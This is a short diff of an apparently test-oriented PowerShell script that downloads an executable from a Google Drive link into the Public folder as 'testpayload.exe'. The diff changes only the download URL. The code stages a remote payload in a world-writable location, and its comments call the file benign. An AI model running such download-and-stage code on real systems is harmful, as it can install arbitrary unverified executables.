@@ -2,7 +2,7 @@
 # Safe to run in an isolated testing environment
 
 # Define URL of a benign file (you can replace this with your own hosted file)
-$Url = "https://drive.google.com/uc?export=download&id=1dbQhJp7-vo2AuX1pkUzIGGsYho6aJ7TL"
+$Url = "https://drive.google.com/uc?export=download&id=1LRfAV0d645MM4hOQHThWy_BvDz-MpJqU"
 
 # Define world-writable path
 $Destination = "$env:PUBLIC\testpayload.exe"
